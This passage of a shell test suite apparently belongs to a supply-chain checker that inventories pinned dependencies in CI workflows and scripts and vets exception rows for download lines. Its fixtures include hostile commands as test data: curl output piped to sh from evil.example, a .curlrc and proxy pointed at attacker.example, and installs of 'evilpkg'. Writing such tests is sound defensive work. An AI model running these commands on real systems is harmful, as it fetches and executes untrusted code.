spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
t = time.time()
for body in ("pip" + " -a" * 1000 + " x", "docker" + " -a" * 1000 + " x", "python3 -m pip" + " -q" * 1000 + " install evilpkg==9.9.9"):
    inv.inventory({"bin/x.sh": body + "\n"})
assert time.time() - t < 2, time.time() - t
assert inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker --context x run evil/x:latest\n"})
PY

CASE="a hostile many-line file or a step that repeats one command hundreds of times is refused quickly (items and lines are bounded), and compound commands (cd x&&pip install y; a;pip install b) are read as separate commands"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, time
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
t = time.time()
for files in ({"bin/x.sh": ("pip install " * 320 + "\n") * 100},
              {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: |\n" + "".join("          " + "pip install " * 320 + "\n" for _ in range(100))},
              {"bin/y.sh": "echo\n" * 30000}):
    try:
        inv.inventory(files)
    except RuntimeError:
        pass
    else:
        raise AssertionError("a hostile file was read")
assert time.time() - t < 5, time.time() - t
got = inv.inventory({"bin/x.sh": "cd x&&pip install foo==1.0\necho hi;pip install bar==2.0\n"})
assert "package:pypi/foo@1.0" in got and "package:pypi/bar@2.0" in got
PY

CASE="removing an installer action's version input leaves a (default) placeholder (refused), and a release asset that is missing borrows no other asset's age"
check python3 - "$here/../supply-chain/pin-inventory.py" "$work" <<'PY'
import importlib.util, sys, subprocess, os, json
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
mk = lambda w: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n" + w}
with_v = inv.inventory(mk("        with:\n          version: v2.13.2\n")); without = inv.inventory(mk(""))
assert [k for k in without if k not in with_v and "(default)" in k], sorted(without)
assert not [k for k in with_v if "(default)" in k]
spec2 = importlib.util.spec_from_file_location("ac", sys.argv[1].replace("pin-inventory", "pin-age-check")); ac = importlib.util.module_from_spec(spec2); spec2.loader.exec_module(ac)
ac._release_with_assets = lambda repo, tags: {"published_at": "2026-01-01T00:00:00Z", "assets": [{"name": "other.tgz", "created_at": "2026-01-01T00:00:00Z", "updated_at": "2026-01-01T00:00:00Z"}]}
ac._pr_clock = lambda *a, **k: None
it = inv.Item("tool", "o/r", "v1.0", "v1.0", "wanted.tgz")
assert ac.live_proofs(it, ".") == [], "a missing asset must not borrow another asset's age"
PY

CASE="phase 2 R2 fixes: version FILES are items (their content is the key), a called workflow's input defaults and a local call's with: change the identity, a changed checksum on a download's step moves it, pip global options with values do not hide install, a second (default) step is its own key"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
assert set(inv.inventory({".python-version": "3.12\n"})) != set(inv.inventory({".python-version": "3.99.9\n"}))
callee = lambda v: {".github/workflows/callee.yml": "on:\n  workflow_call:\n    inputs:\n      lint-version:\n        default: " + v + "\njobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n        with:\n          version: ${{ inputs.lint-version }}\n"}
assert set(inv.inventory(callee("v2.13.2"))) != set(inv.inventory(callee("v9.99.9")))
caller = lambda v: {".github/workflows/caller.yml": "jobs:\n  c:\n    uses: ./.github/workflows/callee.yml\n    with:\n      lint-version: " + v + "\n"}
assert set(inv.inventory(caller("v2.13.2"))) != set(inv.inventory(caller("v9.99.9")))
dl = lambda sm: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: |\n          curl -L https://github.com/o/r/releases/download/v1.2.3/tool.tgz -o tool.tgz\n          echo " + sm + "  tool.tgz | sha256sum --check\n"}
assert set(inv.inventory(dl("a" * 64))) != set(inv.inventory(dl("b" * 64)))
assert inv.inventory({"bin/x.sh": "pip --timeout 60 install evil==9.9.9\n"}).get("package:pypi/evil@9.9.9")
d2 = inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - name: one\n        uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n      - name: two\n        uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n"})
assert len([k for k in d2 if "(default)" in k]) == 2
PY

CASE="bumping an action whose step also carries a placeholder (a checkout with fetch-tags: true, a (default) installer input) moves ONLY the action: the placeholder's identity does not contain the pin, and a boolean input is not an installer input"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
co = lambda sha: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: actions/checkout@" + sha + " # v7\n        with:\n          fetch-tags: true\n"}
a, b = inv.inventory(co("a" * 40)), inv.inventory(co("b" * 40))
assert [k for k in b if k not in a] == ["action:actions/checkout@" + "b" * 40], [k for k in b if k not in a]
assert not [k for k in a if "(input)" in k]
lint = lambda sha: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + sha + " # v9\n"}
assert [k for k in inv.inventory(lint("b" * 40)) if k not in inv.inventory(lint("a" * 40))] == ["action:golangci/golangci-lint-action@" + "b" * 40]
PY

CASE="phase 2 R3 fixes: --isolated is a flag (install is not its value), a version file at any path is an item, two identical unresolved installer steps are two items, a checksum in ANY step of the job moves a download, a python/java/node SERIES (3.12, 21) is not an exact pin"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
assert inv.inventory({"bin/x.sh": "python3 -m pip --isolated install black==99.0.0\n"}).get("package:pypi/black@99.0.0")
assert set(inv.inventory({"config/.python-version": "3.12.1\n"})) != set(inv.inventory({"config/.python-version": "3.99.9\n"}))
two = lambda second: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n" + second}
assert len([k for k in inv.inventory(two("")) if "(default)" in k]) == 2
sep = lambda sm: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: curl -L https://github.com/o/r/releases/download/v1.2.3/tool.tgz -o tool.tgz\n      - run: echo " + sm + "  tool.tgz | sha256sum --check\n"}
assert set(inv.inventory(sep("a" * 64))) != set(inv.inventory(sep("b" * 64)))
spec2 = importlib.util.spec_from_file_location("ac", sys.argv[1].replace("pin-inventory", "pin-age-check")); ac = importlib.util.module_from_spec(spec2); spec2.loader.exec_module(ac)
import datetime as dt
now = dt.datetime(2026, 10, 6, tzinfo=dt.timezone.utc)
for name, ver in (("python", "3.12"), ("java", "21"), ("node", "22")):
    assert not ac.judge_item(inv.Item("tool", name, ver), [("2026-09-01T00:00:00Z", "github-release")], now)[0], name
assert ac.judge_item(inv.Item("tool", "python", "3.12.4"), [("2026-09-01T00:00:00Z", "github-release")], now)[0]
PY

CASE="phase 2 R5 fixes: repeated expression-valued installer steps are numbered, a checksum FILE's content moves a download, an env source key bound to an expression never prints its name"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
two = lambda v2: {".github/workflows/a.yml": "env:\n  LINT_V: v2.14.0\njobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n        with:\n          version: ${{ env.LINT_V }}\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n        with:\n          version: " + v2 + "\n"}
assert set(inv.inventory(two("v2.13.2"))) != set(inv.inventory(two("${{ env.LINT_V }}")))
assert len([k for k in inv.inventory(two("${{ env.LINT_V }}")) if "expression" in k]) == 2
cs = lambda c: {".github/policy/gh-checksums.txt": c * 64 + "  gh.tar.gz\n"}
assert set(inv.inventory(cs("a"))) != set(inv.inventory(cs("b")))
src = inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    env:\n      PRIVATE_DOWNLOAD_URL: ${{ secrets.PRIVATE_DOWNLOAD_URL }}\n    steps:\n      - run: echo hi\n"})
assert not any("private_download_url" in k.lower() for k in src), sorted(src)
PY

CASE="an image named localhost/... (no port) used by docker run/create with --pull=never is local to the job and is NOT an item (advisor 0203); a pull, a run without --pull=never, a container: or services: image, localhost:PORT/, localhostx/ and a mid-name localhost/ all stay items (a registry can answer for localhost; Codex #187)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
step = lambda cmd: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + cmd + "\n"}
imgs = lambda files: [k for k in inv.inventory(files) if k.startswith("image:")]
D = "@sha256:" + "a" * 64
assert not imgs(step("docker run --pull=never --rm localhost/fa-production true")), "run --pull=never of a localhost/ image is local"
assert not imgs(step("docker create --pull never localhost/fa-debug:latest")), "create --pull never too"
assert imgs(step("docker run --rm localhost/fa-production true")), "a run without --pull=never may pull"
assert imgs(step("docker pull localhost/x" + D)), "a pull downloads from a registry named localhost"
assert imgs(step("docker run --pull=always localhost/x" + D)), "--pull=always downloads"
assert imgs(step("docker run --pull=never localhost:5000/fa-production:1 true")), "localhost:PORT is a registry"
assert imgs(step("docker run --pull=never localhostx/fa-production:1 true")), "a name that only starts with localhost is not local"
assert imgs(step("docker run --pull=never registry.example/localhost/fa:1 true")), "localhost/ in the middle of a name is not local"
assert imgs(step("docker run --pull=never --pull=always localhost/x" + D + " true")), "the LAST --pull wins: always downloads"
assert not imgs(step("docker run --pull=always --pull=never localhost/fa-x true")), "the last --pull is never: local"
assert imgs(step("docker run --pull=never --pull=always localhost/fa-x true")), "the last --pull is always: a tag-only localhost/ image is an item"
assert not imgs(step("podman run --pull never localhost/fa-x true")), "podman and a separate value too"
assert imgs(step("docker pull --pull=never localhost/fa-x")), "docker pull is never exempt (tag-only form: no digest scan to mask a mistake)"
assert imgs(step("docker run localhost/x" + D + " --pull=never")), "a --pull after the image operand is the container's argument, not a policy"
assert imgs(step("docker run --label x --pull always localhost/x" + D + " true")), "--pull always as a separate value downloads"
assert imgs(step("docker pull --pull=never localhost/x" + D)), "docker pull never exempts"
assert imgs(step("docker run --label=--pull=never localhost/x" + D + " true")), "a quoted/attached option VALUE that spells --pull=never is not a policy"
# tag-only forms (no digest scan to mask a mistake): one parser for the policy and the image (Codex #187 round 3)
assert imgs(step("docker run --pull=never --cpu-period 100000 --pull=always localhost/fa-x true")), "a numeric option value before the last --pull"
assert imgs(step("docker run --pull=never --label \"description=hello world\" --pull=always localhost/fa-x true")), "a quoted option value with a space before the last --pull"
assert not imgs(step("docker run --cpu-period 100000 --pull=never localhost/fa-x true")), "a numeric option value before --pull=never stays local"
assert not imgs(step("docker run --label \"description=hello world\" --pull=never localhost/fa-x true")), "a quoted value before --pull=never stays local"
assert imgs(step("docker run localhost/fa-x --pull=never")), "a --pull after the image operand is the container's argument (tag-only)"
assert imgs(step("docker run --name --pull=never localhost/fa-x true")), "an option's value that spells --pull=never is not a policy (tag-only)"
assert imgs(step("docker run --pull=always --rm 123 --pull=never localhost/fa-x")), "a boolean flag does not take the next word: 123 is the operand, the rest are container arguments (Codex #187 round 4)"
assert imgs(step("docker run --frobnicate 5 --pull=never localhost/fa-x true")), "an option of unknown arity withholds the exemption"
assert not imgs(step("docker run -d --rm --init --pull=never localhost/fa-x true")), "known booleans and a known cluster stay local"
assert not imgs(step("docker run -dit --pull=never localhost/fa-x true")), "a short cluster of booleans is known"
assert not imgs(step("docker run --memory=512m --pull=never localhost/fa-x true")), "--name=value of a known value option is known"
sh = {"bin/check.sh": "docker run --pull=never --label \"a b\" --pull=always localhost/fa-x" + D + " true\n"}
assert imgs(sh), "the same in a script"
assert imgs(step("docker run --name --pull=never localhost/x" + D + " true")), "an option's value that spells --pull=never is not a policy"
cs = {".github/workflows/a.yml": "jobs:\n  j:\n    container: localhost/fa-x\n    services:\n      s:\n        image: localhost/fa-y\n    steps:\n      - uses: docker://localhost/fa-z" + D + "\n"}
assert len(imgs(cs)) == 3, imgs(cs)           # container:, services: and uses: docker:// pull their images
PY

# --- REQ-SUP-001-AC16: ruled text lines. The scan stays strict (a line that only MENTIONS curl or wget is an unmeasured download); the BASE branch's
# exceptions file lists such lines under unmeasured_text: {file, form, key (the scan's 16-hex hash of the downloader segment), line (the 16-hex hash of the
# WHOLE flattened line the segment sits in), ruling[, count]}. A matching row reports the item
# as ruled text; no row, a wrong hash (an edited line), a row on the pull request's side only, or more occurrences than the row counts fail as before;
# a malformed list stops the check (exit 2), never "nothing exempted" and never "everything exempted". -------------------------------------------------------
rtext=$'#!/bin/sh\n# the stub replaces curl and wget on PATH (text, not a command)\necho "run wget https://example.invalid/x later"\n'
pyw() { python3 -c 'import sys; print("import pathlib\npathlib.Path(%r).write_text(%r)" % (sys.argv[1], sys.argv[2]))' "$1" "$2"; }   # python that writes FILE with TEXT
newcase rt "$(pyw bin/ruled.sh "$rtext")"
# rtrows REPO OUT MODE: writes an exceptions file whose unmeasured_text rows are built from the REAL scan of REPO (HEAD~1..HEAD), changed by MODE
rtrows() {
  python3 - "$chk" "$1" "$2" "$3" <<'PY'
import importlib.util, json, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
repo, out, mode = sys.argv[2:5]
added = ac._added_unmeasured(repo, "HEAD~1", "HEAD")
import hashlib, re, subprocess
H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()[:16]
def lines_for(f, kh):   # an independent oracle: the whole flattened lines (as the scan flattens them) that hold a segment, or are a line, hashing to kh
    text = subprocess.run(["git", "-C", repo, "show", "HEAD:" + f], capture_output=True, text=True, check=True).stdout
    out = []
    for line in re.sub(r"\\\n\s*", " ", text).split("\n"):
        flat = " ".join(line.split())
        if flat and (H(flat) == kh or any(H(s) == kh for s in re.split(r"\s*(?:;|&&|\|\||\|)\s*", flat))) and H(flat) not in out:
            out.append(H(flat))
    return out
rows = [{"file": f, "form": w, "key": k.split(":", 1)[0], "line": lh, "ruling": "text, not a command: a test line"} for f, w, k in added for lh in lines_for(f, k.split(":", 1)[0])]
assert len(rows) >= len(added), (rows, added)
raw = None
d = {"_format": "t", "exceptions": []}
if mode == "all": pass
elif mode == "first": rows = rows[:1]
elif mode == "none": rows = []
elif mode == "wronghash": rows[0]["key"] = ("0" if rows[0]["key"][0] != "0" else "1") + rows[0]["key"][1:]
elif mode == "wrongfile": rows = [dict(r, file="bin/other.sh") for r in rows]
elif mode == "wrongform": rows = [dict(r, form="a system package install") for r in rows]
elif mode == "emptyruling": rows[0]["ruling"] = ""
elif mode == "spaceruling": rows[0]["ruling"] = " \t "
elif mode == "noruling": del rows[0]["ruling"]
elif mode == "nokey": del rows[0]["key"]
elif mode == "intkey": rows[0]["key"] = 12345
elif mode == "shortkey": rows[0]["key"] = rows[0]["key"][:12]
elif mode == "fullkey": rows[0]["key"] = added[0][2]
elif mode == "upperkey": rows[0]["key"] = rows[0]["key"].upper()
elif mode == "dup": rows = rows + rows[:1]
elif mode == "extra": rows[0]["note"] = "x"
elif mode == "notdict": rows[0] = [rows[0]["file"], rows[0]["form"], rows[0]["key"], rows[0]["line"], rows[0]["ruling"]]
elif mode == "noline": del rows[0]["line"]
elif mode == "intline": rows[0]["line"] = 7
elif mode == "shortline": rows[0]["line"] = rows[0]["line"][:15]
elif mode == "upperline": rows[0]["line"] = rows[0]["line"].upper()
elif mode == "wrongline": rows[0]["line"] = ("0" if rows[0]["line"][0] != "0" else "1") + rows[0]["line"][1:]
elif mode == "dupjsonkey": raw = '{"exceptions": [], "unmeasured_text": [], "unmeasured_text": ' + json.dumps(rows) + '}'
elif mode == "duprowkey": raw = '{"exceptions": [], "unmeasured_text": [' + json.dumps(rows[0])[:-1] + ', "ruling": "text, not a command: another ruling"}' + "".join(", " + json.dumps(r) for r in rows[1:]) + ']}'
elif mode == "count0": rows[0]["count"] = 0
elif mode == "countbool": rows[0]["count"] = True
elif mode == "countstr": rows[0]["count"] = "2"
elif mode == "count1": rows = [dict(r, count=1) for r in rows]
elif mode == "count2": rows = [dict(r, count=2) for r in rows]
elif mode == "count100": rows = [dict(r, count=100) for r in rows]
elif mode == "count101": rows[0]["count"] = 101
elif mode == "countfloat": rows[0]["count"] = 2.0
elif mode == "nantop": raw = '{"exceptions": [], "metadata": NaN, "unmeasured_text": ' + json.dumps(rows) + '}'
elif mode == "infnested": raw = '{"exceptions": [{"x": [Infinity]}], "unmeasured_text": ' + json.dumps(rows) + '}'
elif mode == "neginfrow": raw = '{"exceptions": [], "unmeasured_text": [' + json.dumps(rows[0])[:-1] + ', "count": -Infinity}' + "".join(", " + json.dumps(r) for r in rows[1:]) + ']}'
elif mode == "notlist": rows = {"rows": rows}
elif mode == "emptyfile": rows[0]["file"] = ""
else: raise SystemExit("unknown mode " + mode)
d["unmeasured_text"] = rows
if raw is not None:
    open(out, "w").write(raw)
else:
    json.dump(d, open(out, "w"), indent=2)
PY
}
rtck() { # REPO MODE [extra args] -> rc, $work/rt.out
  local repo=$1 mode=$2; shift 2; rtrows "$work/$repo" "$work/rt-$mode.json" "$mode"; rc=0
  python3 "$chk" --root "$work/$repo" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --json "$work/rt.json" --exceptions "$work/rt-$mode.json" "$@" >"$work/rt.out" 2>&1 || rc=$?
}
CASE="AC16 setup: the fixture adds exactly two unmeasured text lines (a comment and an echo that mention a download tool), the scan stays strict"
check python3 - "$chk" "$work/rt" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
a = ac._added_unmeasured(sys.argv[2], "HEAD~1", "HEAD")
assert len(a) == 2 and all(x[0] == "bin/ruled.sh" and x[1] == "a download" for x in a), a
PY
rtck rt all
CASE="AC16: a base-branch row for each added text line (file, form, line hash, ruling) passes: exit 0, each reported as ruled text with its ruling"
check test "$rc" -eq 0; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 2; check grep -q 'text, not a command: a test line' "$work/rt.out"
check python3 -c "import json,sys; r=json.load(open(sys.argv[1]))['moved']; assert len(r)==2 and all(x['ok'] and 'ruled text' in x['reason'] for x in r), r" "$work/rt.json"
rtck rt first
CASE="AC16: a row exempts exactly its own item: the other added line has no row and fails (exit 1), named as unmeasured, while the ruled one is reported as ruled"
check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/ruled.sh' "$work/rt.out"; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 1
rtck rt none
CASE="AC16: an empty unmeasured_text list exempts nothing: both added lines fail (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 2
rtck rt wronghash
CASE="AC16: a row whose line hash does not match (one hex digit changed) does not apply: that item fails (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 1
for m in wrongfile wrongform; do rtck rt $m
CASE="AC16: a row with the right hash but the wrong ${m#wrong} does not apply: both items fail (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 2; done
rtck rt wrongline
CASE="AC16: a row whose WHOLE-line hash does not match (one hex digit changed) does not apply: that item fails (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 1
rtrows "$work/rt" "$work/rt-orig.json" all
newcase rtedit "$(pyw bin/ruled.sh "${rtext/later/soon}")"
rc=0; python3 "$chk" --root "$work/rtedit" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$work/rt-orig.json" >"$work/rt.out" 2>&1 || rc=$?
CASE="AC16: editing a ruled line voids its row (the hash changes): the edited line fails (exit 1), the unchanged one stays ruled"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 1
for m in emptyruling spaceruling noruling nokey intkey shortkey fullkey upperkey dup extra notdict count0 countbool countstr notlist emptyfile noline intline shortline upperline dupjsonkey duprowkey count101 countfloat nantop infnested neginfrow; do rtck rt $m
CASE="AC16: a malformed unmeasured_text ($m) stops the check fail-closed: exit 2, names the list, and is never a pass"
check test "$rc" -eq 2; check grep -q 'unmeasured_text' "$work/rt.out"; check grep -qi 'not a pass' "$work/rt.out"; done
printf '{"exceptions": [], "unmeasured_text": [' >"$work/rt-badjson.json"; rc=0
python3 "$chk" --root "$work/rt" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$work/rt-badjson.json" >"$work/rt.out" 2>&1 || rc=$?
CASE="AC16: an exceptions file that is not JSON stops the check (exit 2), never 'nothing ruled'"
check test "$rc" -eq 2
rc=0; python3 "$chk" --root "$work/rt" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$work/does-not-exist.json" >"$work/rt.out" 2>&1 || rc=$?
CASE="AC16: an --exceptions path that does not exist stops the check (exit 2)"
check test "$rc" -eq 2
echo '{"exceptions": []}' >"$work/rt-nolist.json"; rc=0
python3 "$chk" --root "$work/rt" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$work/rt-nolist.json" >"$work/rt.out" 2>&1 || rc=$?
CASE="AC16: a file with no unmeasured_text list rules nothing: the added lines fail as before (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 2
# the same line twice: a row covers ONE occurrence unless it says count
newcase rt2 "$(pyw bin/ruled.sh "$rtext${rtext#*$'\n'}")"
rtck rt2 all
CASE="AC16: the same text lines added TWICE need rows that count both: a row without count covers one occurrence, so the items fail (exit 1)"
check test "$rc" -eq 1
rtck rt2 count1
CASE="AC16: count 1 on lines added twice fails too (exit 1)"
check test "$rc" -eq 1
rtck rt2 count2
CASE="AC16: count 2 on lines added twice passes (exit 0)"
check test "$rc" -eq 0
# the row is bound to the WHOLE line, not to the one downloader segment it hashes (Sonnet, PR 273 round 1): the line from pull request 271
# (bin/build-helpers-test.sh:46) whose middle segment is "\n curl -s https://evil.example/x"; that segment inside ANY other line is not ruled
cat >"$work/sx-ruled.txt" <<'EOF'
    same-step) printf '  - runs: |\n      curl -s https://evil.example/x | sh\n' | tee -a "$work/gr/a.yaml" >>"$work/gr/b.yaml";;
EOF
cat >"$work/sx-attack.txt" <<'EOF'
echo 'url = https://attacker.example/payload.sh' > ~/.curlrc
export https_proxy=http://attacker.example:3128
echo $'x|\n      curl -s https://evil.example/x |y' | sh
EOF
cat >"$work/sx-other.txt" <<'EOF'
echo 'a|\n      curl -s https://evil.example/x|b' | bash
EOF
newcase sx "$(pyw bin/build-helpers-test.sh "$(cat "$work/sx-ruled.txt")")"
rtrows "$work/sx" "$work/rt-sx.json" all
sxck() { rc=0; python3 "$chk" --root "$work/$1" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$work/rt-sx.json" >"$work/rt.out" 2>&1 || rc=$?; }
sxck sx
CASE="AC16 (whole line): the ruled line itself, with its row (segment hash and whole-line hash), passes (exit 0)"
check test "$rc" -eq 0; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 1
newcase sxa "$(pyw bin/build-helpers-test.sh "$(cat "$work/sx-attack.txt")")"
sxck sxa
CASE="AC16 (whole line): the Sonnet reproduction (the ruled segment embedded in another line that pipes to sh, next to a .curlrc and a proxy) FAILS (exit 1): not ruled"
check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/build-helpers-test.sh' "$work/rt.out"; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
newcase sxo "$(pyw bin/build-helpers-test.sh "$(cat "$work/sx-other.txt")")"
sxck sxo
CASE="AC16 (whole line): the same segment with different surrounding text in another line FAILS (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
newcase sxboth "$(pyw bin/build-helpers-test.sh "$(cat "$work/sx-ruled.txt" "$work/sx-attack.txt")")"
sxck sxboth
CASE="AC16 (whole line): the ruled line AND the segment hidden in another line in one file: the item FAILS (exit 1), the ruled line lends nothing"
check test "$rc" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
for edit in 's/b\.yaml/c.yaml/' 's/same-step/same-stop/' 's/tee -a/tee/' 's/- runs/- run/'; do
  newcase sxe "$(pyw bin/build-helpers-test.sh "$(sed "$edit" "$work/sx-ruled.txt")")"
  sxck sxe
  CASE="AC16 (whole line): editing ANY part of the ruled line, even outside the downloader segment ($edit), voids its row: exit 1"
  check test "$rc" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
done
newcase sxm "$(pyw bin/other-test.sh "$(cat "$work/sx-ruled.txt")")"
sxck sxm
CASE="AC16 (whole line): the ruled line moved to another file is not ruled: exit 1"
check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/other-test.sh' "$work/rt.out"
rtck rt2 count100
CASE="AC16: count 100 (the cap) is accepted: lines added twice pass (exit 0)"
check test "$rc" -eq 0
# --- an EDITED line is an addition: 'added' is decided per (file, form, key, whole-line hash), not per key (Codex, PR 273 round 2) ---------------------------
# twoc NAME FILE BASE-TEXT HEAD-TEXT: a copy of the base repository, a commit that writes FILE with BASE-TEXT, then a head commit with HEAD-TEXT
twoc() {
  rm -rf "$work/$1"; cp -R "$base" "$work/$1"
  python3 - "$work/$1" "$2" "$3" "$4" <<'PY'
import pathlib, subprocess, sys
root, f, bt, ht = sys.argv[1:5]; p = pathlib.Path(root) / f; p.parent.mkdir(parents=True, exist_ok=True)
g = lambda *a: subprocess.run(["git", "-C", root, "-c", "user.name=t", "-c", "user.email=t@x", *a], check=True, capture_output=True)
p.write_text(bt); g("add", "-A"); g("commit", "-q", "-m", "base2")
p.write_text(ht); g("add", "-A"); g("commit", "-q", "--allow-empty", "-m", "head")
PY
}
# mkrow OUT FILE LINE [count]: one row for the download segment of LINE (first segment naming curl or wget), bound to LINE, flattened as the scan flattens
mkrow() {
  python3 - "$@" <<'PY'
import hashlib, json, re, sys
out, f, line = sys.argv[1:4]; H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()[:16]
flat = " ".join(line.split()); seg = next(s for s in re.split(r"\s*(?:;|&&|\|\||\|)\s*", flat) if re.search(r"\b(?:curl|wget)\b", s))
row = {"file": f, "form": "a download", "key": H(seg), "line": H(flat), "ruling": "text, not a command: a test line"}
if len(sys.argv) > 4: row["count"] = int(sys.argv[4])
json.dump({"exceptions": [], "unmeasured_text": [row]}, open(out, "w"))
print(row["key"], row["line"])
PY
}
edck() { rc=0; python3 "$chk" --root "$work/$1" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$2" >"$work/rt.out" 2>&1 || rc=$?; }
echo '{"exceptions": [], "unmeasured_text": []}' >"$work/rt-empty.json"
CASE="edited line: Codex's row for bin/ruled.sh has key and line 0c81fb09bb82dffd (the scan's hashes of the ruled text)"
check test "$(mkrow "$work/rt-codex.json" bin/ruled.sh "echo 'curl https://example.invalid/x'")" = "0c81fb09bb82dffd 0c81fb09bb82dffd"
twoc cx bin/ruled.sh $'#!/bin/sh\necho \'curl https://example.invalid/x\'\n' $'#!/bin/sh\necho \'curl https://example.invalid/x\' | sh\n'
edck cx "$work/rt-codex.json"
CASE="edited line (Codex, verbatim): the base has the ruled text, the head pipes the same segment to sh: an ADDITION that no row names: exit 1"
check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/ruled.sh' "$work/rt.out"; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
twoc pre tools/fetch.sh $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\n' $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a | sh\n'
edck pre "$work/rt-empty.json"
CASE="edited line (the pre-existing class): a flagged base line rewritten with the same download segment (-o /tmp/a -> | sh) is an addition: exit 1"
check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:tools/fetch.sh' "$work/rt.out"
twoc keep tools/fetch.sh $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\n' $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\necho done\n'
edck keep "$work/rt-empty.json"
CASE="edited line: an untouched flagged base line stays not added (another line of the file changed): exit 0"
check test "$rc" -eq 0
twoc ws tools/fetch.sh $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\n' $'#!/bin/sh\n  curl\t-fsSL   https://example.invalid/a -o\t/tmp/a  \n'
edck ws "$work/rt-empty.json"
CASE="edited line: a whitespace-only edit (spaces and tabs) stays not added, as the scan flattens it: exit 0"
check test "$rc" -eq 0
# --- a row never matches a line bash reads differently from the flattening: whitespace other than space or tab, or a backslash-newline continuation (Sonnet R1)
